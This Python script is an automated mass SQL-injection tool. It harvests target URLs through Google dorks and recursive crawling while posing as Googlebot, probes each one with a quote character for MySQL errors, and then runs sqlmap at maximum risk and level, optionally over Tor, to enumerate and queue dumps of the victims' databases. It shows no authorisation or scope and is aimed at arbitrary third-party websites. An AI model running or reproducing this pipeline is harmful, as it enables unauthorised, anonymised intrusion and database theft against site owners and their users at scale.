import time
import sys
import os
import re
from random import randint
from urllib import request
from selenium.common.exceptions import TimeoutException
from selenium import webdriver
from selenium.common.exceptions import NoSuchWindowException
import _thread
from config import PRIORITY_FILE,ERROR_FILE,SITES_FILE,DORK_LIST_FILE,RECURSIVE_SITES_FILE,SQLMAP_PATH,FIREFOX_DRIVER,BANNING_FILE,BANNED_KEYWORDS_FILE


# DO NOT CHANGE THIS
FALSE = 0
SQL_ERROR = 1
SIZE_CHANGE = 2
BLUE_FONT = '\033[94m'	# getsColor
YELLOW_FONT = '\033[93m'  # test_sites color
GREEN_FONT = '\033[92m'   # exploit color
END_FONT = '\033[0m'	  # end color
# CONFIGURATION FILES
PRIORITY_FILE_LOCK = False
ERROR_FILE_LOCK = False
RECURSIVE_SITES_FILE_LOCK = False
SITES_FILE_LOCK = False
DORK_LIST_FILE_LOCK = False
BANNING_FILE_LOCK = False
BANNED_KEYWORDS_FILE_LOCK = False
BANNED_KEYWORDS = []


def get_domain_name(link):
	if link[-1] == '\n':
		link = link[:-1]
	x = link
	x = x[x.find('//') + 2:]
	if x.find('/') != -1:
		x = x[:x.find('/')]

	if x[0:4] == 'www.':
		x = x[4:]

	result = x[x.rfind("."):]

	x = x[0:x.rfind(".")]

	if x.rfind(".") == -1:
		result = x + result
	else:
		result = x[x.rfind(".") + 1:] + result
	return result


def valid(link):
	if link[-1] == '/':
		link = link[:-1]
	BANNED_KEYWORDS = get_sites(
		BANNED_KEYWORDS_FILE,
		BANNED_KEYWORDS_FILE_LOCK)
	queue = get_sites(PRIORITY_FILE, PRIORITY_FILE_LOCK) + \
		get_sites(ERROR_FILE, ERROR_FILE_LOCK)
	banned_ext = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
	# print(link+'\n')
	for ext in banned_ext:
		if link[len(link) - len(ext):] == ext:
			print("NO : extention " + ext + " banned\n")
			return False
	if link[link.find('//') + 2:].find('/') == -1:
		print("NO : site without parameters\n")
		return False
	for keyword in BANNED_KEYWORDS:
		if keyword == '' or keyword == "\n":
			continue
		if keyword[len(keyword) - 1] == '\n':
			keyword = keyword[:len(keyword) - 1]
		if get_domain_name(link).find(keyword) != -1:
			print("NO : " + keyword + "domain banned\n")
			return False
	for keyword in queue:
		if keyword[len(keyword) - 1] == '\n':
			keyword = keyword[:len(keyword) - 1]
		if get_domain_name(link).find(get_domain_name(keyword)) != -1:
			print("NO : " + keyword + "domain already in queue\n")
			return False

	return True


def check_ext(url):
	banned_exts = [".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
	for banned_ext in banned_exts:
		if url.find(banned_ext + "?") != -1:

			return False
		elif url[len(url) - len(banned_ext):] == banned_ext:

			return False
	return True


def check_ext_for_injection(url):
	banned_exts = [".jpg", ".html", ".jpeg", ".png", ".pdf", ");", ".js"]
	for banned_ext in banned_exts:
		if url.find(banned_ext + "?") != -1:
			print("no ext banned")
			return False
		elif url[len(url) - len(banned_ext):] == banned_ext:
			print("no ext banned")
			return False

	return True


def filter_list_of_recursive(liste):
	result = []
	for l in liste:
		add = True
		for valid in result:
			if get_domain_name(l) == get_domain_name(valid):
				add = False
				break
		if add:
			if l[len(l)] - 1 == '/':
				l = l[:len(l) - 1]
			result.append(l)
	return result


def get_recursive_urls(link, recurive_search):
	if recurive_search == 0:
		return []

	text = ""
	headers = {
		'Referer': 'http://www.google.com/bot.html',
		'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
	}

	try:
		print("recursive for " + link)
		req = request.Request(link, headers=headers)
		response = request.urlopen(req)
		text = response.read().decode("utf-8")
		# site_len=len(page_source)
	except BaseException:
		print("error opening site" + link)
		text = ""

	urls = re.findall(
		r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+',
		text)

	urls_filtered = [
		i for i in urls if (
			get_domain_name(i) != get_domain_name(link) and check_ext(i)) and not bool(re.match(r"https*:\/\/[^\/]*\/$",i)) and not bool(re.match(r"https*:\/\/[^\/]*$",i))]

	print("extracted %s filtred %s" % (str(len(urls)), str(len(urls_filtered))))
	append_sites_on_file(urls_filtered, SITES_FILE, SITES_FILE_LOCK)

	for url in urls_filtered:
		get_recursive_urls(url, recurive_search - 1)


def extract_sites(query):
	page = 0
	results = 1
	liste = []
	browser = webdriver.Firefox()
	while results > 0:
		url = 'https://www.google.fr/search?q=%s&start=%s' % (query, page)

		try:
			browser.get(url)
			source = browser.page_source.find('g-recaptcha-response')
		except TimeoutException:
			print("Network error")
			pass
		except BaseException:
			browser.close()
			browser = webdriver.Firefox()
			browser.get(url)
			source = browser.page_source.find('g-recaptcha-response')
			pass

		while source != -1:
			time.sleep(60)
			try:
				source = browser.page_source.find('g-recaptcha-response')
			except TimeoutException:
				print("Network error")
				pass
			except NoSuchWindowException:
				browser.close()
				browser = webdriver.Firefox()
				browser.get(url)
				source = browser.page_source.find('g-recaptcha-response')
				pass

		else:
			for site in browser.find_elements_by_class_name('r'):
				try:
					link = site.find_element_by_tag_name(
						'a').get_attribute('href')
				except BaseException:
					link = "https://www.google.fr/"
					pass
				if link[len(link) - 1] == '/':
					link = link[0:len(link) - 1]
				# GET SITES ON SITE

				liste.append(link)

			results = len(browser.find_elements_by_class_name('r'))
			page += 10

	print("%s sites extracted \n" % str(len(liste)))
	append_sites_on_file(liste, SITES_FILE, SITES_FILE_LOCK)
	append_sites_on_file(
		liste,
		RECURSIVE_SITES_FILE,
		RECURSIVE_SITES_FILE_LOCK)
	browser.close()


def test_char(source, size_of_original):
	keywords = ['mysql', 'syntax']
	for keyword in keywords:
		if source.lower().find(keyword) != -1:
			print(keyword + " keyword found")
			return SQL_ERROR
	if abs(size_of_original - len(source)) > 100:
		print("size change")
		return SIZE_CHANGE
	else:
		print("not vulnerable")
		return False


def test_site(site):
	if site[-1] == '\n':
		site = site[0:-1]

	sql_chars = ['\'']

	headers = {
		'Referer': 'http://www.google.com/bot.html',
		'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
	}

	try:
		req = request.Request(site, headers=headers)
		response = request.urlopen(req)
		page_source = response.read().decode("utf-8")
		site_len = len(page_source)
	except BaseException:
		print("error opening site")
		return False

	for sql_char in sql_chars:

		result = False
		try:
			req = request.Request(site + sql_char, headers=headers)
			response = request.urlopen(req)
			page_source = response.read().decode("utf-8")
			result = test_char(page_source, site_len)

		except Exception:
			print("error opening site with injection char")

			return False

		if result == SQL_ERROR or result == SIZE_CHANGE:

			return result

	return False


def test_sites(SITES_FILE_LOCK):

	l_sql = []
	l_error = []
	i = 0

	sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)

	while sites_num == 0:
		print(YELLOW_FONT + "Waiting for vulnerable sites to come\n" + END_FONT)
		time.sleep(60)
		sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)

	while sites_num > 0:
		site = get_site(SITES_FILE, SITES_FILE_LOCK)
		if site[len(site) - 1] == '/':
			site = site[0:len(site) - 1]
		i += 1
		print((YELLOW_FONT + "Testing site %s of %s %s" + END_FONT) %
			  (sites_num, str(i), site))
		if site[-1] == '\n':
			site = site[0:-1]
		if check_ext_for_injection(site) and valid(site):

			res = test_site(site)
			if res == SQL_ERROR:
				print(YELLOW_FONT + "sql" + END_FONT)
				l_sql.append(site)
				append_site_on_file(
					site + "\n",
					PRIORITY_FILE,
					PRIORITY_FILE_LOCK)
			elif res == SIZE_CHANGE:
				print(YELLOW_FONT + "maybe" + END_FONT)
				l_error.append(site)
				append_site_on_file(site + "\n", ERROR_FILE, ERROR_FILE_LOCK)
		sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)
		while sites_num == 0:
			print(
				YELLOW_FONT +
				"Waiting for vulnerable sites to come\n" +
				END_FONT)
			time.sleep(60)
			sites_num = get_number(SITES_FILE, SITES_FILE_LOCK)

	return (l_sql, l_error)


def get_sites_by_dork(dork):
	dork = dork.replace('&', '%26')
	dork = dork.replace(' ', '+')
	extract_sites(dork)


def append_sites_on_file(l, file, lock):

	while lock:
		print("Waiting for %s To be unlocked" % (file))
	lock = True

	files = open(file, "a")

	files.writelines('\n'.join(l))
	files.close()

	lock = False


def append_site_on_file(site, file_name, lock):

	while lock:
		print("waiting for %s To be Unlocked" % (file))
	lock = True

	file = open(file_name, "a")

	file.write('%s' % site)
	file.close()

	lock = False


def test_if_ban(liste, site, banning_file_lock):
	if site[-1] == '\n':
		site = site[0:-1]
	num_of_tests = 1
	result = False
	for site_to_check in liste:

		if site_to_check.find(site) != -1:

			liste.remove(site_to_check)
			num_of_tests = int(site_to_check.split(":")[1])
			if num_of_tests > 5:
				result = True
				print(site + " banned")
			else:
				num_of_tests = num_of_tests + 1

				result = False
			break
	if not result:

		liste.append(site + ":" + str(num_of_tests) + "\n")
	while banning_file_lock:
		print("waiting for %s To be Unlocked" % (BANNING_FILE))
	banning_file_lock = True

	files = open(BANNING_FILE, "w")
	files.writelines(liste)
	files.close()

	banning_file_lock = False

	return result


def filter():
	files = os.listdir("finished")
	for file in files:
		db_list = []
		if file[0] != ".":
			print("Checking file " + file, end="")
			f = open("finished/" + file, "r")
			found = False
			lines = f.readlines()
			if len(lines) > 1:
				site = lines[0]
				if site[-1] == "\n":
					site = site[:-1]
				lines = lines[1:]
			for line in lines:
				if line.find("[*] ") != -1 and line.find("[*] ending") == - \
						1 and line.find("[*] starting") == -1:
					db_list.append(
						line.replace(
							'\n', '')[
							line.find("[*] ") + 4:])
				if line.find("fetched data logged") != -1:
					found = True
			if not found:
				os.remove("finished/" + file)
				print("\n")
				list_of_removed = get_sites(BANNING_FILE, BANNING_FILE_LOCK)

				if test_if_ban(list_of_removed,
							   file[:-7] + "\n",
							   BANNING_FILE_LOCK):
					append_site_on_file(file[:-7] + "\n",
										BANNED_KEYWORDS_FILE,
										BANNED_KEYWORDS_FILE_LOCK)

			else:
				if len(db_list) > 0:
					print(" Found db\n")
					with open("dbs/" + file, "w+") as result:
						result.write(site + "\n")
						for db in db_list:
							result.write(
								"python " +
								SQLMAP_PATH +
								"/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch --random-agent -D " %
								(site,
								 ) +
								db +
								"\n")
						result.close()
					os.remove("finished/" + file)
				else:
					print(" Found but not db\n")
					os.rename("finished/" + file, "maybe/" + file)

			f.close()


def get_site(file_name, lock):

	while lock:
		print("waiting for %s To be Unlocked" % (file_name))
	lock = True

	files = open(file_name, "r")
	sites = files.readlines()
	files.close()
	site = sites[0]
	del sites[0]

	files = open(file_name, "w")
	if len(sites) > 0:
		files.writelines(sites)
	files.close()

	lock = False

	return site


def get_sites(file_name, lock):

	while lock:
		print("waiting for %s To be Unlocked" % (file_name))
	lock = True

	files = open(file_name, "r")
	sites = files.readlines()

	return sites


def get_number(file_name, lock):

	while lock:
		print("waiting for %d To be Unlocked" % (file_name))
	lock = True

	files = open(file_name, "r")
	sites = files.readlines()
	files.close()

	lock = False

	return len(sites)


def exploit(max_threads,tor):

	priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)

	error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)

	os.system("mkdir working")
	os.system("mkdir finished")
	os.system("mkdir dbs")
	os.system("mkdir maybe")
	while priority_file_number == 0 and error_file_number == 0:
		print(GREEN_FONT + "Waiting for sites to come\n" + END_FONT)
		time.sleep(60)

		priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)

		error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)

	while priority_file_number > 0 or error_file_number > 0:

		while get_sqlmap_threads() > max_threads:
			print(GREEN_FONT +"Waiting for others to finish exploit\n" +END_FONT)
			time.sleep(100)

		else:

			if priority_file_number > 0:
				site = get_site(PRIORITY_FILE, PRIORITY_FILE_LOCK)

			else:
				site = get_site(ERROR_FILE, ERROR_FILE_LOCK)

			priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)

			error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)

			if site[len(site) - 1] == '\n':
				site = site[0:len(site) - 1]
			site_file = get_domain_name(site)
			random_int1 = randint(0, 9)
			random_int2 = randint(0, 9)
			print(GREEN_FONT +"executing exploit for " +site_file +"\n" +END_FONT)
			if tor:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py  --tor --tor-type=SOCKS5 -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			else:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			os.system(command)
			while priority_file_number == 0 and error_file_number == 0:
				print(GREEN_FONT + "Waiting for sites to come\n" + END_FONT)
				time.sleep(50)

				priority_file_number = get_number(
					PRIORITY_FILE, PRIORITY_FILE_LOCK)

				error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)

	else:
		print(GREEN_FONT + "no sites to test" + END_FONT)


def all(max_threads, recursive_search_number,tor):

	_thread.start_new_thread(gets, ())
	_thread.start_new_thread(test_sites, (SITES_FILE_LOCK,))
	_thread.start_new_thread(exploit, (max_threads,tor))
	if recursive_search_number > 0:
		_thread.start_new_thread(recursive_search, (recursive_search_number,))

	while True:
		pass


def gets():
	print(BLUE_FONT)
	dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
	while dorks_number == 0:
		print(BLUE_FONT + "Waiting for new dorks" + END_FONT)
		time.sleep(60)
		dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
	while dorks_number > 0:
		dork = get_site(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
		get_sites_by_dork(dork)
		dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
		while dorks_number == 0:
			print(BLUE_FONT + "Waiting for new dorks" + END_FONT)
			time.sleep(60)
			dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)

	print("End get dorks")





def recursive_search(number):

	print("recurive_search")
	ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
	sites_number = get_number(RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)
	while sites_number == 0:
		print("Waiting for new sites for recursive_search")
		time.sleep(60)
		sites_number = get_number(
			RECURSIVE_SITES_FILE,
			RECURSIVE_SITES_FILE_LOCK)
	while ready_to_check_number > 1000:
		print("proirity to readyToCheck_sites")
		time.sleep(60)
		ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)

	while sites_number > 0:

		link = get_site(RECURSIVE_SITES_FILE, RECURSIVE_SITES_FILE_LOCK)

		get_recursive_urls(link, number)

		ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)
		sites_number = get_number(
			RECURSIVE_SITES_FILE,
			RECURSIVE_SITES_FILE_LOCK)

		while sites_number == 0:
			print("Waiting for new sites for recursive_search")
			time.sleep(60)
			sites_number = get_number(
				RECURSIVE_SITES_FILE,
				RECURSIVE_SITES_FILE_LOCK)
		while ready_to_check_number > 1000:
			print("proirity to readyToCheck_sites")
			time.sleep(60)
			ready_to_check_number = get_number(SITES_FILE, SITES_FILE_LOCK)

	print("end recurive_search")


def get_sqlmap_threads():
	return int(int(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))

def sites():
	print(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d'").readline())
def main():
	recursive_search=0
	threads=1
	tor=False
	if len(sys.argv)==2 and sys.argv[1]=="filter":
		filter()
		exit(0)
	if len(sys.argv)==2 and sys.argv[1]=="sites":
		sites()
		exit(0)
	if "--tor" in sys.argv :
		tor=True
	if "--threads" in sys.argv :
		threads = int(sys.argv[sys.argv.index("--threads")+1])
	if "--rc" in sys.argv :
		recursive_search = int(sys.argv[sys.argv.index("--rc")+1])
	all(threads,recursive_search,tor)   
   # if len(sys.argv) == 4 and sys.argv[1] == "get":
   #	 get_sites_by_dork(sys.argv[2])
   #	 if int(sys.argv[3]) > 0:
   #		 recursive_search(int(sys.argv[3]))
   #	 test_sites(SITES_FILE_LOCK)
#
   # elif len(sys.argv) == 3 and sys.argv[1] == "exploit":
   #	 max_threads = int(sys.argv[2])
   #	 exploit(max_threads)
#
   # elif len(sys.argv) == 2 and sys.argv[1] == "filter":
   #	 filter()
   # elif len(sys.argv) == 3 and sys.argv[1] == "recursive_search":
   #	 recursive_search(int(sys.argv[2]))
   # elif len(sys.argv) == 3 and sys.argv[1] == "gets":
   #	 gets()
   #	 if int(sys.argv[3]) > 0:
   #		 recursive_search(int(sys.argv[3]))
   # elif len(sys.argv) == 4 and sys.argv[1] == "all":
   #	 all(int(sys.argv[2]), int(sys.argv[3]))
   # else:
   #	 print("usage : " + sys.argv[0] + " get dork recursive_search\n")
   #	 print("usage : " + sys.argv[0] + " gets recursive_search\n")
   #	 print("usage : " + sys.argv[0] + " exploit max_threads\n")
   #	 print("usage : " + sys.argv[0] + " filter\n")
   #	 print("usage : " + sys.argv[0] + " recursive_search int\n")
   #	 print("usage : " + sys.argv[0] + " all max_threads recursive_search\n")


if __name__ == '__main__':
	main()
